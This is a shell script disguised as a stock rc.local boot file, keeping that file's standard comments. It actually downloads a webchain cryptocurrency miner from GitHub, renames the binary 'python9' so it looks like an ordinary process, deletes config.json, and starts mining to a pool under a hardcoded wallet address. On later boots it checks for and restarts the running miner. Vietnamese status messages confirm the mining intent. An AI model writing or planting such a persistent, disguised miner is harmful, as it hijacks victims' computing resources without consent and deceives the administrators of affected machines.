#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python9 ]; then
    if pgrep -x "python9" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python9 -o web-ko1.gonspool.com:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x

     
fi
exit
fi


wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
mv webchain-miner python9
rm config.json
./python9 -o web-ko1.gonspool.com:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x

exit 0
